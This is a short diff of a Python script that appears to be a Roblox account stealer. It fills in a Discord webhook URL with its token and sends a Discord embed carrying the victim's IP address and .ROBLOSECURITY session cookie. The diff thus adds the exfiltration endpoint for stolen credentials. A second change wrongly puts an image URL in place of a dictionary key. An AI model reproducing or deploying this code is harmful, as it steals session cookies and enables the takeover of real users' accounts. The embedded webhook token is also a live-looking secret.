@@ -3,7 +3,7 @@ import codecs
 import json
 from base64 import *
 
-webhookk = "heh"
+webhookk = "https://discord.com/api/webhooks/1186053429043400704/HhSw0Yo5KnniKAvEIN_49q0dLSNSfCwi1um_EsbN2jWtZY15FM2bwFUkG75GfoxeH4Wi"
 def command(c):
     os.system(c)
 def cls():
@@ -129,7 +129,7 @@ discord.post(
                 {"name" : "IP Address", "value" : ip_address, "inline:": True},
                 {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
             ],
-            "thumbnail": {"url": headshot},
+            "thumbnail": {"https://i.pinimg.com/236x/c9/79/ba/c979ba730ea50302faf1e927f5bd701d--capuchin-monkeys-primates.jpg": headshot},
 
 
         }
